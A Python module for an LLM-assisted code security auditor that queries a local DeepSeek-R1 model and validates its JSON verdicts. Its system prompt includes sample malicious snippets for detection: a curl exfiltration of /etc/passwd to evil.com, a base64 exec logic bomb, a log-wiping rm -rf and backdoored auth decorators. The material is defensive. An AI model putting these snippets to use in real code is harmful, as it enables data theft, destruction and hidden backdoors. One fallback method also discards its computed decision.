"""
AI Auditor Layer - LLM-Powered Security Analysis

Integrates with DeepSeek-R1 (via Ollama) for hybrid security analysis.
Uses Pydantic guardrails to ensure LLM outputs conform to strict schemas.
Falls back to deterministic AST results on non-compliant or low-confidence outputs.
"""

import json
import time
from dataclasses import dataclass, field
from datetime import datetime
from enum import Enum
from typing import Optional

import httpx
from pydantic import BaseModel, Field, ValidationError

from ..types.violations import Severity, SecurityViolation, ScanContext


# =============================================================================
# PYDANTIC SCHEMAS (LLM Output Guardrails)
# =============================================================================

class VulnerabilityType(str, Enum):
    """Types of vulnerabilities detected by the AI Auditor."""
    WASHED_SECRET = "WASHED_SECRET"          # Secret hashed with weak algo (MD5/SHA1) then logged
    LOGIC_BOMB = "LOGIC_BOMB"                # Time/condition-based triggers
    HIDDEN_STATE = "HIDDEN_STATE"            # Environmental triggers (os.getlogin, hostname checks)
    INSECURE_DECORATOR = "INSECURE_DECORATOR"  # Auth/logging decorators that bypass security
    BROKEN_AUTH = "BROKEN_AUTH"              # Missing validation in auth functions
    TAINT_FLOW = "TAINT_FLOW"                # Tainted data reaching sinks
    HARDCODED_SECRET = "HARDCODED_SECRET"
    INJECTION = "INJECTION"
    NONE = "NONE"


class LLMVulnerabilityResponse(BaseModel):
    """
    Strict schema for LLM vulnerability analysis.
    
    The LLM MUST output JSON matching this exact structure.
    Non-compliant outputs are rejected and fallback to AST results.
    
    This schema serves as "Output Sanitization" - constraining LLM responses
    to a predictable, validated structure that can be safely processed.
    """
    vulnerability: bool = Field(
        description="Whether the code contains a security vulnerability"
    )
    reasoning: str = Field(
        min_length=10,
        max_length=1000,
        description="Detailed explanation of the security analysis"
    )
    remediation: str = Field(
        min_length=10,
        max_length=500,
        description="Recommended fix for the vulnerability"
    )
    confidence: float = Field(
        default=0.5,
        ge=0.0,
        le=1.0,
        description="Confidence level of the analysis (0.0-1.0)"
    )
    severity: str = Field(
        default="MEDIUM",
        pattern="^(CRITICAL|HIGH|MEDIUM|LOW)$",
        description="Severity level if vulnerability exists"
    )
    vulnerability_type: str = Field(
        default="NONE",
        pattern="^(WASHED_SECRET|LOGIC_BOMB|HIDDEN_STATE|INSECURE_DECORATOR|BROKEN_AUTH|TAINT_FLOW|HARDCODED_SECRET|INJECTION|NONE)$",
        description="Classification of the vulnerability type"
    )


class AuditDecision(Enum):
    """Final decision from the auditor."""
    APPROVE = "APPROVE"
    REJECT = "REJECT"
    MANUAL_REVIEW = "MANUAL_REVIEW"
    FALLBACK_TO_AST = "FALLBACK_TO_AST"


@dataclass
class AuditResult:
    """Result of AI-powered security audit."""
    decision: AuditDecision
    llm_response: Optional[LLMVulnerabilityResponse] = None
    ast_violations: list[SecurityViolation] = field(default_factory=list)
    reasoning: str = ""
    confidence: float = 0.0
    fallback_reason: Optional[str] = None
    latency_ms: float = 0.0
    timestamp: datetime = field(default_factory=datetime.utcnow)


# =============================================================================
# OLLAMA CLIENT
# =============================================================================

class OllamaClient:
    """
    Client for Ollama API (local LLM inference).
    
    Supports DeepSeek-R1 Distill models (14B/32B).
    """
    
    DEFAULT_MODEL = "deepseek-r1:14b"
    DEFAULT_BASE_URL = "http://localhost:11434"
    
    def __init__(
        self,
        model: str = DEFAULT_MODEL,
        base_url: str = DEFAULT_BASE_URL,
        timeout: float = 60.0,
    ):
        self.model = model
        self.base_url = base_url
        self.timeout = timeout
        self._client = httpx.Client(timeout=timeout)
    
    def generate(self, prompt: str, system: Optional[str] = None) -> str:
        """Generate completion from Ollama."""
        payload = {
            "model": self.model,
            "prompt": prompt,
            "stream": False,
            "format": "json",  # Request JSON output
        }
        if system:
            payload["system"] = system
        
        try:
            response = self._client.post(
                f"{self.base_url}/api/generate",
                json=payload,
            )
            response.raise_for_status()
            return response.json().get("response", "")
        except httpx.HTTPError as e:
            raise ConnectionError(f"Ollama API error: {e}") from e
    
    def is_available(self) -> bool:
        """Check if Ollama server is running."""
        try:
            response = self._client.get(f"{self.base_url}/api/tags")
            return response.status_code == 200
        except httpx.HTTPError:
            return False
    
    def close(self):
        """Close the HTTP client."""
        self._client.close()


# =============================================================================
# AI AUDITOR
# =============================================================================

class AIAuditor:
    """
    Hybrid security auditor combining LLM reasoning with AST determinism.
    
    Architecture:
    1. AST analysis provides deterministic baseline
    2. LLM provides contextual reasoning
    3. Pydantic validates LLM output
    4. Policy engine makes final decision
    
    On LLM failure or low confidence, falls back to AST results.
    """
    
    SYSTEM_PROMPT = """You are DeepSeek-R1, a Reasoning Detective for Python security analysis.
You receive AST Taint Paths from the deterministic layer. Your job is to analyze the SEMANTIC INTENT
behind the code - not just pattern match, but UNDERSTAND what the code is trying to do.

You MUST respond with valid JSON matching this exact schema:
{
  "vulnerability": boolean,
  "reasoning": "detailed explanation (10-1000 chars)",
  "remediation": "recommended fix (10-500 chars)",
  "confidence": float between 0.0 and 1.0,
  "severity": "CRITICAL" | "HIGH" | "MEDIUM" | "LOW",
  "vulnerability_type": "WASHED_SECRET" | "LOGIC_BOMB" | "HIDDEN_STATE" | "INSECURE_DECORATOR" | "BROKEN_AUTH" | "TAINT_FLOW" | "HARDCODED_SECRET" | "INJECTION" | "NONE"
}

## THE TAINT HANDSHAKE PROTOCOL

You will receive:
1. The RAW CODE being analyzed
2. The AST TAINT PATH (if detected) showing SOURCE → TRANSFORMS → SINK
3. The FUNCTION CONTEXT surrounding the taint

Your job: Determine if the taint path represents MALICIOUS INTENT or just COMPLEX CODE.

## ADVANCED THREAT DETECTION

### 1. WASHED SECRETS (Cryptographic Laundering)
Detect when sensitive data is hashed with WEAK algorithms before being logged:
```python
# CRITICAL: Secret "washed" through MD5 before logging
api_key = os.environ.get("API_KEY")
hashed = hashlib.md5(api_key.encode()).hexdigest()  # MD5 is WEAK!
logging.info(f"Key hash: {hashed}")  # Attacker can rainbow-table this
```
**Detection Rules:**
- MD5 or SHA1 hashing of secrets → WASHED_SECRET (CRITICAL)
- bcrypt/argon2/SHA256+ of secrets → Usually safe, but verify no logging
- Any hash of a secret that reaches a log/print → CRITICAL

### 2. HIDDEN STATE LOGIC (Environmental Logic Bombs)
Detect code that only executes under specific environmental conditions:
```python
# CRITICAL: Logic bomb triggers only for specific user
if os.getlogin() == 'admin' or os.getenv('USER') == 'root':
    subprocess.run(['curl', 'evil.com/exfil', '-d', open('/etc/passwd').read()])

# CRITICAL: Time-delayed payload
if datetime.now() > datetime(2026, 6, 15):
    exec(base64.b64decode(HIDDEN_PAYLOAD))

# SUSPICIOUS: Random trigger (1% chance)
if random.random() < 0.01:
    os.system('rm -rf /tmp/logs')  # Covers tracks occasionally
```
**Detection Rules:**
- `os.getlogin()`, `os.getenv('USER')`, `getpass.getuser()` before dangerous ops → HIDDEN_STATE
- `datetime.now()` comparisons with future dates → LOGIC_BOMB
- `random.random()` or `random.randint()` guarding destructive code → LOGIC_BOMB
- `platform.node()`, `socket.gethostname()` checks → HIDDEN_STATE

### 3. INSECURE DECORATORS (Auth/Logging Bypass)
Detect custom decorators that APPEAR to provide security but actually bypass it:
```python
# CRITICAL: Decorator always returns True (broken auth)
def require_admin(func):
    def wrapper(*args, **kwargs):
        return func(*args, **kwargs)  # NO AUTH CHECK!
    return wrapper

# CRITICAL: Auth decorator that can be disabled via env var
def authenticate(func):
    def wrapper(*args, **kwargs):
        if os.getenv('SKIP_AUTH'):  # Backdoor!
            return func(*args, **kwargs)
        # ... actual auth logic
    return wrapper

# SUSPICIOUS: Logging decorator that silently swallows errors
def safe_call(func):
    def wrapper(*args, **kwargs):
        try:
            return func(*args, **kwargs)
        except:
            pass  # Errors disappear!
    return wrapper
```
**Detection Rules:**
- Decorators named *auth*, *require*, *check*, *validate* that don't actually validate → INSECURE_DECORATOR
- Decorators with `os.getenv()` bypass conditions → INSECURE_DECORATOR (CRITICAL)
- Decorators with bare `except: pass` → INSECURE_DECORATOR (HIGH)
- Decorators that wrap but don't call the original function conditionally → BROKEN_AUTH

### 4. TAINT PATH SEMANTIC ANALYSIS
When provided an AST Taint Path, analyze:

```
TAINT PATH PROVIDED:
  SOURCE: api_key = os.environ.get("API_KEY") [line 5]
  HOP 1: temp = api_key [line 6]
  HOP 2: masked = temp[:4] + "****" [line 7]
  SINK: logging.info(f"Using key: {masked}") [line 8]
```

**Your Analysis:**
- Is the data actually sensitive? (API keys, passwords, tokens = YES)
- Are the transforms sanitizing or obfuscating? ([:4] + "****" = partial mask, still leaks prefix)
- Is the sink dangerous? (logging/print = moderate, subprocess/eval = critical)
- Is there INTENT to hide? (multiple hops through unrelated variables = suspicious)

### 5. BROKEN AUTH (Missing Validation)
```python
# CRITICAL: Function name promises auth but delivers none
def admin_delete_all_users():
    db.execute("DELETE FROM users")  # No auth check!

# CRITICAL: Auth check that always passes
def is_authorized(user):
    return True  # Backdoor!

# SUSPICIOUS: Auth check that ignores result
def protected_action(user):
    check_auth(user)  # Return value ignored!
    do_dangerous_thing()
```

## CONFIDENCE CALIBRATION
- 0.95-1.0: Clear malicious intent (logic bombs, backdoors)
- 0.85-0.95: High-risk pattern with context (washed secrets to logs)
- 0.70-0.85: Suspicious pattern, needs context
- 0.50-0.70: Possible issue, recommend human review
- Below 0.50: Uncertain, defer to AST findings

## THE HYBRID PRINCIPLE
You are the "Meat" to AST's "Bones." AST tells you WHAT data flows WHERE.
You determine WHY and WHETHER it's malicious. If AST found a path and you
disagree, explain your reasoning clearly - a human will arbitrate.

Be a Detective, not a Scanner. False positives erode trust. False negatives enable breaches."""

    CONFIDENCE_THRESHOLD = 0.7
    
    def __init__(
        self,
        ollama_client: Optional[OllamaClient] = None,
        enable_llm: bool = True,
        confidence_threshold: float = CONFIDENCE_THRESHOLD,
    ):
        self._ollama = ollama_client
        self._enable_llm = enable_llm
        self._confidence_threshold = confidence_threshold
        self._llm_available: Optional[bool] = None
    
    @property
    def llm_available(self) -> bool:
        """Check if LLM is available (cached)."""
        if self._llm_available is None:
            if self._ollama is None:
                self._ollama = OllamaClient()
            self._llm_available = self._ollama.is_available()
        return self._llm_available
    
    def audit(
        self,
        code: str,
        ast_violations: list[SecurityViolation],
        context: ScanContext,
    ) -> AuditResult:
        """
        Perform hybrid security audit.
        
        Args:
            code: Source code to analyze
            ast_violations: Pre-computed AST violations (deterministic)
            context: Scan context
        
        Returns:
            AuditResult with decision and reasoning
        """
        start_time = time.time()
        
        # If LLM disabled or unavailable, use AST only
        if not self._enable_llm or not self.llm_available:
            return self._fallback_to_ast(
                ast_violations,
                reason="LLM disabled or unavailable",
                latency_ms=(time.time() - start_time) * 1000,
            )
        
        # Query LLM
        try:
            llm_response = self._query_llm(code)
        except Exception as e:
            return self._fallback_to_ast(
                ast_violations,
                reason=f"LLM query failed: {e}",
                latency_ms=(time.time() - start_time) * 1000,
            )
        
        # Validate with Pydantic
        try:
            validated = self._validate_response(llm_response)
        except ValidationError as e:
            return self._fallback_to_ast(
                ast_violations,
                reason=f"LLM output validation failed: {e}",
                latency_ms=(time.time() - start_time) * 1000,
            )
        
        # Check confidence threshold
        if validated.confidence < self._confidence_threshold:
            return self._fallback_to_ast(
                ast_violations,
                reason=f"LLM confidence {validated.confidence:.2f} < threshold {self._confidence_threshold}",
                latency_ms=(time.time() - start_time) * 1000,
                llm_response=validated,
            )
        
        # Make final decision
        latency_ms = (time.time() - start_time) * 1000
        
        if validated.vulnerability:
            decision = AuditDecision.REJECT
        elif ast_violations:
            # LLM says no vuln but AST found some - trust AST for CRITICAL
            critical = [v for v in ast_violations if v.severity == Severity.CRITICAL]
            if critical:
                decision = AuditDecision.REJECT
            else:
                decision = AuditDecision.MANUAL_REVIEW
        else:
            decision = AuditDecision.APPROVE
        
        return AuditResult(
            decision=decision,
            llm_response=validated,
            ast_violations=ast_violations,
            reasoning=validated.reasoning,
            confidence=validated.confidence,
            latency_ms=latency_ms,
        )
    
    def _query_llm(self, code: str) -> str:
        """Query the LLM for security analysis."""
        prompt = f"""Analyze this Python code for security vulnerabilities:

```python
{code[:2000]}  # Truncated for context window
```

Respond with JSON only."""
        
        return self._ollama.generate(prompt, system=self.SYSTEM_PROMPT)
    
    def _validate_response(self, response: str) -> LLMVulnerabilityResponse:
        """Parse and validate LLM response with Pydantic."""
        # Extract JSON from response (handle markdown code blocks)
        json_str = response.strip()
        if json_str.startswith("```"):
            lines = json_str.split("\n")
            json_str = "\n".join(lines[1:-1])
        
        data = json.loads(json_str)
        return LLMVulnerabilityResponse(**data)
    
    def _fallback_to_ast(
        self,
        ast_violations: list[SecurityViolation],
        reason: str,
        latency_ms: float,
        llm_response: Optional[LLMVulnerabilityResponse] = None,
    ) -> AuditResult:
        """Fall back to deterministic AST results."""
        if ast_violations:
            critical = any(v.severity == Severity.CRITICAL for v in ast_violations)
            decision = AuditDecision.REJECT if critical else AuditDecision.MANUAL_REVIEW
        else:
            decision = AuditDecision.APPROVE
        
        return AuditResult(
            decision=AuditDecision.FALLBACK_TO_AST,
            llm_response=llm_response,
            ast_violations=ast_violations,
            reasoning=f"Fallback to AST: {reason}",
            confidence=1.0 if ast_violations else 0.5,
            fallback_reason=reason,
            latency_ms=latency_ms,
        )
    
    def close(self):
        """Clean up resources."""
        if self._ollama:
            self._ollama.close()
